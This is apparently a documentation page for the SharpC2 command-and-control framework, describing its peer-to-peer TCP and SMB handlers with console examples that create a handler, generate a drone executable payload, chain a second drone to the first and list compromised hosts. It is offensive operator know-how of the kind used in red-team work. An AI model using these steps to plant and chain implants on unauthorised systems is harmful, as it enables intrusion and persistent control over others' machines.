# Peer-to-Peer

SharpC2 has built-in TCP & SMB handlers for peer-to-peer C2 between drones.  The handlers don't run on the team server, so the `start` command doesn't actually do anything for these.  They simply acts as templates for payload generation.

```text
[handlers] > create demo-tcp TCP
[+] Handler "demo-tcp" created.

[handlers] > set demo-tcp BindPort 4444
[+] BindPort set to 4444

[handlers] > set demo-tcp LocalhostOnly true
[+] LocalhostOnly set to true
```

```text
[drones] > payload demo-tcp Exe /tmp/tcp-drone.exe
[+] 164352 bytes saved.
```

TCP and SMB drones can be connected to using the `connect` and `link` commands respectively.

```text
[ba60b4aac6] > connect localhost 4444
[+] Tasked Drone to run connect.
[+] Drone checked in.  Sent 192 bytes.
[+] Drone task 758e24e2d9 has completed.
[+] Drone 87fe8b8650 checked in from Daniel@Ghost-Canyon.
```

```text
[drones] > list

Guid        Parent      Address        Hostname      Username  Process     Pid    Integrity  Arch  LastSeen
----        ------      -------        --------      --------  -------     ---    ---------  ----  --------
ba60b4aac6  -           192.168.1.229  Ghost-Canyon  Daniel    http-drone  21964  Medium     x64   24/11/2021 20:23:56
87fe8b8650  ba60b4aac6  192.168.1.229  Ghost-Canyon  Daniel    smb-drone   2988   Medium     x64   24/11/2021 20:23:36
```